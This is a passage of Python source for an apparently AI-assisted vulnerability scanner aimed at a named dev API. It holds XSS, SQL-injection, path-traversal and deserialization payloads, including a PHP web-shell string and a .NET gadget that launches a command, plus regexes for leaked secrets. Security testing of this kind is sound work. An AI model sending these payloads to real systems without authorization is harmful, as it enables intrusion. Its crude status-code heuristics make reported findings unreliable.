                (r'api[_-]?key["\']?\s*[:=]\s*["\']?[^"\'\s]+["\']?', 'API key'),
                (r'secret["\']?\s*[:=]\s*["\']?[^"\'\s]+["\']?', 'Secret'),
                (r'token["\']?\s*[:=]\s*["\']?[^"\'\s]+["\']?', 'Token'),
                (r'jwt["\']?\s*[:=]\s*["\']?[^"\'\s]+["\']?', 'JWT'),
                (r'private[_-]?key["\']?\s*[:=]\s*["\']?[^"\'\s]+["\']?', 'Private key'),
                (r'aws[_-]?key["\']?\s*[:=]\s*["\']?[^"\'\s]+["\']?', 'AWS key')
            ]

            for pattern, data_type in sensitive_patterns:
                if re.search(pattern, response.text):
                    self.vulnerabilities.append(
                        Vulnerability(
                            type=VulnerabilityType.SENSITIVE_DATA,
                            endpoint=url,
                            description=f"Potential {data_type} exposure detected",
                            severity="High",
                            evidence=response.text[:200],
                            chain_of_thought=[]
                        )
                    )
                    
        except Exception as e:
            logger.error(f"Error testing sensitive data for {url}: {str(e)}")

    def _test_broken_access(self, url: str, method: str) -> None:
        """Test for broken access control vulnerabilities."""
        # Test with different user roles or IDs
        test_ids = ['1', '2', 'admin', 'user']
        for test_id in test_ids:
            try:
                modified_url = f"{url}?id={test_id}"
                response = self.session.request(method, modified_url)
                
                if response.status_code == 200:
                    self.vulnerabilities.append(
                        Vulnerability(
                            type=VulnerabilityType.BROKEN_ACCESS,
                            endpoint=url,
                            description=f"Potential broken access control: Accessible with ID {test_id}",
                            severity="High",
                            evidence=f"Status code: {response.status_code}",
                            chain_of_thought=[]
                        )
                    )
            except Exception as e:
                logger.error(f"Error testing broken access for {url}: {str(e)}")

    def _test_xss(self, url: str, method: str) -> None:
        """Test for Cross-Site Scripting (XSS) vulnerabilities."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
        ]

        for payload in xss_payloads:
            try:
                params = {'input': payload, 'search': payload}
                response = self.session.request(method, url, params=params)
                
                if payload in response.text:
                    self.vulnerabilities.append(
                        Vulnerability(
                            type=VulnerabilityType.XSS,
                            endpoint=url,
                            description=f"Potential XSS vulnerability detected with payload: {payload}",
                            severity="High",
                            evidence=response.text[:200],
                            chain_of_thought=[]
                        )
                    )
            except Exception as e:
                logger.error(f"Error testing XSS for {url}: {str(e)}")

    def _test_insecure_deserialization(self, url: str, method: str) -> None:
        """Test for insecure deserialization vulnerabilities."""
        # Test with various serialized payloads
        payloads = [
            '{"rce":"<?php system($_GET[\'cmd\']); ?>"}',
            '{"type":"java.lang.Runtime","exec":"calc.exe"}',
            '{"$type":"System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","ExpandedWrapperObject":"<ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:System=\"clr-namespace:System;assembly=mscorlib\" xmlns:Diag=\"clr-namespace:System.Diagnostics;assembly=system\"><ObjectDataProvider x:Key=\"LaunchCalc\" ObjectType=\"{x:Type Diag:Process}\" MethodName=\"Start\"><ObjectDataProvider.MethodParameters><System:String>cmd</System:String><System:String>/c calc</System:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>"}'
        ]

        for payload in payloads:
            try:
                response = self.session.request(
                    method,
                    url,
                    json=json.loads(payload),
                    headers={'Content-Type': 'application/json'}
                )
                
                if response.status_code != 400 and response.status_code != 500:
                    self.vulnerabilities.append(
                        Vulnerability(
                            type=VulnerabilityType.INSECURE_DESERIALIZATION,
                            endpoint=url,
                            description="Potential insecure deserialization vulnerability detected",
                            severity="Critical",
                            evidence=f"Status code: {response.status_code}",
                            chain_of_thought=[]
                        )
                    )
            except Exception as e:
                logger.error(f"Error testing insecure deserialization for {url}: {str(e)}")

    def _test_security_misconfig(self, url: str, method: str) -> None:
        """Test for security misconfiguration vulnerabilities."""
        progress.log_step(f"Testing for security misconfiguration: {url}")
        
        try:
            response = self.session.request(method, url)
            headers = response.headers
            
            # Define security headers with their recommended values and explanations
            security_headers = {
                'X-Content-Type-Options': {
                    'recommended': 'nosniff',
                    'description': 'Prevents browsers from MIME-sniffing the response',
                    'impact': 'Without this header, browsers might execute scripts in non-script contexts'
                },
                'X-Frame-Options': {
                    'recommended': 'DENY or SAMEORIGIN',
                    'description': 'Prevents clickjacking attacks',
                    'impact': 'Without this header, the site could be embedded in iframes on malicious sites'
                },
                'X-XSS-Protection': {
                    'recommended': '1; mode=block',
                    'description': 'Enables browser\'s XSS filtering',
                    'impact': 'Without this header, XSS attacks might not be blocked by the browser'
                },
                'Strict-Transport-Security': {
                    'recommended': 'max-age=31536000; includeSubDomains',
                    'description': 'Forces browsers to use HTTPS',
                    'impact': 'Without this header, users might be vulnerable to man-in-the-middle attacks'
                },
                'Content-Security-Policy': {
                    'recommended': "default-src 'self'",
                    'description': 'Controls which resources can be loaded',
                    'impact': 'Without this header, the site is vulnerable to XSS and other injection attacks'
                },
                'Referrer-Policy': {
                    'recommended': 'strict-origin-when-cross-origin',
                    'description': 'Controls how much referrer information is sent',
                    'impact': 'Without this header, sensitive information might be leaked in referrer headers'
                }
            }
            
            missing_headers = []
            for header, info in security_headers.items():
                if header not in headers:
                    missing_headers.append(header)
                    self.vulnerabilities.append(
                        Vulnerability(
                            type=VulnerabilityType.SECURITY_MISCONFIG,
                            endpoint=url,
                            description=f"Missing {header} header: {info['description']}",
                            severity="Medium",
                            evidence=f"Header {header} not present. Recommended value: {info['recommended']}. Impact: {info['impact']}",
                            chain_of_thought=[
                                f"Security header {header} is missing",
                                f"This header is used to {info['description'].lower()}",
                                f"Without this header, {info['impact'].lower()}",
                                f"Recommended value: {info['recommended']}"
                            ]
                        )
                    )
                else:
                    # Log existing headers for analysis
                    progress.log_step(f"Found security header: {header}", {
                        "value": headers[header],
                        "recommended": info['recommended']
                    })
            
            if missing_headers:
                progress.log_step("Missing security headers detected", {
                    "missing_headers": missing_headers,
                    "total_missing": len(missing_headers)
                })
                    
            # Test for verbose error messages
            if response.status_code >= 400:
                error_indicators = [
                    ('stack trace', 'Stack trace exposed in error response'),
                    ('exception', 'Exception details exposed'),
                    ('error at', 'Error location information exposed'),
                    ('warning:', 'Warning messages exposed'),
                    ('debug:', 'Debug information exposed'),
                    ('sql syntax', 'SQL syntax error details exposed')
                ]
                
                found_errors = []
                for indicator, description in error_indicators:
                    if indicator in response.text.lower():
                        found_errors.append(description)
                        self.vulnerabilities.append(
                            Vulnerability(
                                type=VulnerabilityType.SECURITY_MISCONFIG,
                                endpoint=url,
                                description=description,
                                severity="Medium",
                                evidence=response.text[:200],
                                chain_of_thought=[
                                    f"Error response contains '{indicator}'",
                                    "Verbose error messages can reveal implementation details",
                                    "This information could help attackers understand the system",
                                    "Consider implementing generic error messages"
                                ]
                            )
                        )
                
                if found_errors:
                    progress.log_step("Verbose error messages detected", {
                        "error_types": found_errors,
                        "status_code": response.status_code
                    })
                    
        except Exception as e:
            logger.error(f"Error testing security misconfig for {url}: {str(e)}")
            progress.log_step("Error during security misconfiguration testing", {"error": str(e)})

    def _test_insufficient_logging(self, url: str, method: str) -> None:
        """Test for insufficient logging and monitoring."""
        progress.log_step(f"Testing for insufficient logging: {url}")
        
        try:
            # Test with potentially suspicious inputs
            test_inputs = [
                "' OR '1'='1",  # SQL injection attempt
                "<script>alert('xss')</script>",  # XSS attempt
                "../../../etc/passwd",  # Path traversal attempt
                "admin' --",  # Authentication bypass attempt
            ]
            
            for test_input in test_inputs:
                params = {'input': test_input, 'id': test_input}
                response = self.session.request(method, url, params=params)
                
                # Check if response contains the input (might indicate insufficient input validation)
                if test_input in response.text:
                    self.vulnerabilities.append(
                        Vulnerability(
                            type=VulnerabilityType.INSUFFICIENT_LOGGING,
                            endpoint=url,
                            description="Potential insufficient input validation and logging",
                            severity="Medium",
                            evidence=f"Input '{test_input}' reflected in response",
                            chain_of_thought=[]
                        )
                    )
                    
        except Exception as e:
            logger.error(f"Error testing insufficient logging for {url}: {str(e)}")

    def generate_report(self) -> str:
        """Generate a detailed security report with chain of thought."""
        progress.start_phase("Report Generation")
        
        report = ["Security Testing Report", "=" * 50, ""]
        
        # Add chain of thought summary
        report.extend([
            "Chain of Thought Analysis",
            "-" * 50,
            *[f"- {thought}" for thought in self.chain_of_thought.thoughts],
            "",
            "Technology Stack Identified:",
            *[f"- {tech}" for tech in self.chain_of_thought.tech_stack],
            "",
            "Vulnerabilities Found:",
            "-" * 50
        ])
        
        # Group vulnerabilities by type
        vulnerabilities_by_type = {}
        for vuln in self.vulnerabilities:
            if vuln.type.value not in vulnerabilities_by_type:
                vulnerabilities_by_type[vuln.type.value] = []
            vulnerabilities_by_type[vuln.type.value].append(vuln)
        
        # Analyze each vulnerability type with AI
        for vuln_type, vulns in vulnerabilities_by_type.items():
            progress.log_step(f"Analyzing {vuln_type} vulnerabilities", {"count": len(vulns)})
            
            # Prepare context for AI analysis
            context = {
                "vulnerability_type": vuln_type,
                "affected_endpoints": [v.endpoint for v in vulns],
                "severity_levels": [v.severity for v in vulns],
                "descriptions": [v.description for v in vulns],
                "evidence": [v.evidence for v in vulns]
            }
            
            # Convert vulnerabilities to serializable format
            serializable_vulns = []
            for v in vulns:
                vuln_dict = {
                    "type": v.type.value,  # String value of the enum
                    "endpoint": v.endpoint,
                    "description": v.description,
                    "severity": v.severity,
                    "evidence": v.evidence,
                    "chain_of_thought": v.chain_of_thought
                }
                serializable_vulns.append(vuln_dict)
            
            # Get AI analysis for this vulnerability type
            ai_analysis = self.chain_of_thought.ai_model.analyze_vulnerability(
                f"Vulnerability Type: {vuln_type}",
                json.dumps(context),
                {"findings": serializable_vulns}
            )
            
            # Add vulnerability type section to report
            report.extend([
                f"\n{vuln_type} Vulnerabilities",
                "-" * 50,
                f"Total Findings: {len(vulns)}",
                "",
                "Impact Analysis:",
                ai_analysis.get('impact_analysis', 'No impact analysis available'),
                "",
                "Recommendations:",
                *[f"- {rec}" for rec in ai_analysis.get('recommendations', ['No recommendations available'])],
                "",
                "Detailed Findings:"
            ])
            
            # Add individual vulnerability details
            for vuln in vulns:
                report.extend([
                    f"\nEndpoint: {vuln.endpoint}",
                    f"Severity: {vuln.severity}",
                    f"Description: {vuln.description}",
                    "Evidence:",
                    vuln.evidence,
                    "Chain of Thought:",
                    *[f"  - {thought}" for thought in vuln.chain_of_thought],
                    "-" * 30
                ])
        
        # Add overall risk assessment
        progress.log_step("Generating overall risk assessment")
        overall_context = {
            "total_vulnerabilities": len(self.vulnerabilities),
            "vulnerability_types": list(vulnerabilities_by_type.keys()),
            "severity_distribution": {
                "High": len([v for v in self.vulnerabilities if v.severity == "High"]),
                "Medium": len([v for v in self.vulnerabilities if v.severity == "Medium"]),
                "Low": len([v for v in self.vulnerabilities if v.severity == "Low"])
            }
        }
        
        # Convert all vulnerabilities to serializable format for overall analysis
        serializable_all_vulns = []
        for v in self.vulnerabilities:
            vuln_dict = {
                "type": v.type.value,  # String value of the enum
                "endpoint": v.endpoint,
                "description": v.description,
                "severity": v.severity,
                "evidence": v.evidence,
                "chain_of_thought": v.chain_of_thought
            }
            serializable_all_vulns.append(vuln_dict)
        
        overall_analysis = self.chain_of_thought.ai_model.analyze_vulnerability(
            "Overall Security Assessment",
            json.dumps(overall_context),
            {"findings": serializable_all_vulns}
        )
        
        report.extend([
            "\nOverall Risk Assessment",
            "=" * 50,
            overall_analysis.get('risk_assessment', 'No risk assessment available'),
            "",
            "Key Findings:",
            *[f"- {finding}" for finding in overall_analysis.get('key_findings', ['No key findings available'])],
            "",
            "Priority Recommendations:",
            *[f"- {rec}" for rec in overall_analysis.get('priority_recommendations', ['No priority recommendations available'])],
            "",
            "Next Steps:",
            *[f"- {step}" for step in overall_analysis.get('next_steps', ['No next steps available'])]
        ])
        
        progress.end_phase(f"Generated report with {len(self.vulnerabilities)} vulnerabilities")
        return "\n".join(report)

def main():
    progress.start_phase("Security Scan")
    
    # Configure the base URL
    base_url = "https://api-dev.javelin.live"
    progress.log_step(f"Starting security scan for {base_url}")
    
    # Initialize the security agent
    progress.log_step("Initializing security agent")
    agent = SecurityAgent(
        base_url=base_url,
        headers={
            'User-Agent': 'Security Testing Agent',
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        }
    )
    
    # Run the security scan
    progress.log_step("Starting security scan")
    vulnerabilities = agent.discover_and_test()
    
    # Generate and print the report
    progress.log_step("Generating security report")
    report = agent.generate_report()
    
    # Save report to file
    timestamp = time.strftime("%Y%m%d-%H%M%S")
    report_file = f"security_report_{timestamp}.txt"
    with open(report_file, 'w') as f:
        f.write(report)
    progress.log_step(f"Report saved to {report_file}")
    
    # Print report summary
    print("\n" + "="*80)
    print("SECURITY TESTING REPORT FOR api-dev.javelin.live")
    print("="*80 + "\n")
    print(report)
    
    progress.end_phase(f"Security scan completed. Found {len(vulnerabilities)} vulnerabilities.")

if __name__ == "__main__":
    main()
